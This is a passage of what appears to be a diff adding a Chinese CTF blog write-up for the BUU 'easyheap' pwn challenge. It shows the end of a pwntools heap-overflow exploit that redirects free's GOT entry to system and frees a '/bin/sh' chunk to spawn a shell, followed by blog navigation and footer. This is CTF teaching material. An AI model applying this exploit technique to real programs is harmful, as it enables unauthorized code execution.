class="line">sh.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#heap2</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;96&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change heap0 pointer to free_got</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&#x27;1000&#x27;</span>)</span><br><span class="line">pay=<span class="string">&quot;a&quot;</span>*(offset)+p64(free_got)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,pay)</span><br><span class="line"><span class="comment">#change free_got content to system_plt</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&#x27;1000&#x27;</span>)</span><br><span class="line">pay=p64(system_plt)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,pay)</span><br><span class="line"><span class="comment">#change heap1 content to binsh</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&#x27;1000&#x27;</span>)</span><br><span class="line">pay=<span class="string">&quot;/bin/sh&quot;</span>+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,pay)</span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/08/buu-easyheap/binsh.png"></p>
+<blockquote>
+<p>成功getshell</p>
+</blockquote>
+<p><img src="https://img1.doubanio.com/view/group_topic/l/public/p363316808.webp" alt="img"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/buu/" rel="tag"># buu</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/fastbin/" rel="tag"># fastbin</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/29/%E5%8D%97%E5%86%A5%E7%A5%9E%E5%8A%9F/" rel="prev" title="南冥神功">
+      <i class="fa fa-chevron-left"></i> 南冥神功
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#malloc-chunk-amp-fastbin"><span class="nav-number">2.1.</span> <span class="nav-text">malloc_chunk&amp;fastbin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc%E6%A6%82%E8%BF%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">malloc概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin"><span class="nav-number">2.1.2.</span> <span class="nav-text">fastbin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#House-of-Spirit-fastbin-attack"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">House of Spirit(fastbin attack)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yang</p>
+  <div class="site-description" itemprop="description">it is funny</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
